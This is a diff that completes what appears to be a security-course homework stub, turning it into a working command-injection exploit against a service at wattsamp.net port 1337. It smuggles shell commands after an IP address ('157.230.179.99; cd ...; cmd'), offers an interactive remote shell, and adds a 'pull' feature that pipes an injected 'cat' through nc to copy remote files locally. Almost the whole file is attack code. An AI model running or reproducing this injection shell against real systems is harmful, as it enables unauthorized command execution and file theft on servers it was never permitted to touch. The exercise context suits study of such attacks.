@@ -1,37 +1,74 @@
-"""
-    Use the same techniques such as (but not limited to):
-        1) Sockets
-        2) File I/O
-        3) raw_input()
-
-    from the OSINT HW to complete this assignment. Good luck!
-"""
-
 import socket
+import os
 
-host = "wattsamp.net" # IP address here
-port = 1337 # Port here
+host = "wattsamp.net"
+port = 1337
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/3/library/socket.html
-        How to use the socket s:
+def help_message():
+    print("shell: create an interactive shell")
+    print("pull <remote-path> <local-path>: download files")
+    print("help: shows this help menu")
+    print("quit: quit the shell")
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+def execute_cmd(cmd, pwd):
+    # change directory
+    if cmd.split()[0] == "cd":
+        if len(cmd.split()) == 2:
+            if cmd.split()[1][0] == "/":
+                pwd = cmd.split()[1]
+            else:
+                pwd += cmd.split()[1]
+        elif len(cmd.split()) == 1:
+            pwd = "/"
+        else:
+            print("Error")
 
-            Reading:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+    data = s.recv(1024)
 
-            Sending:
+    s.send("157.230.179.99; cd " + pwd + "; " + cmd + "\n")
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
+    data = s.recv(1024)
+    print(data)
 
+    return pwd
+
+def run_shell():
+    pwd = "/"
+    cmd = raw_input(pwd + "> ")
+
+    while cmd != "quit" and cmd != "exit":
+        # print help message
+        if cmd.split()[0] == "help":
+            if len(cmd.split()) == 1:
+                help_message()
+            else:
+                print("help does not take any commands, try again")
+
+        # copy file onto local machine
+        elif cmd.split()[0] == "pull":
+            if len(cmd.split()) == 3:
+                remote_path = cmd.split()[1]
+                local_path = cmd.split()[2]
+
+                attack = "echo \"157.230.179.99; cd " + pwd + "; cat " + remote_path + "\" | nc wattsamp.net 1337 >> " + local_path
+
+                os.system(attack)
+
+            else:
+                print("pull takes two arguments: the remote path location and the local path location")
+
+        # run any other command
+        else:
+            pwd = execute_cmd(cmd, pwd)
+
+        cmd = raw_input(pwd + "> ")
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    print("(hint: type shell)")
+    inp = raw_input("> ")
+
+    if inp == "shell":
+        run_shell()
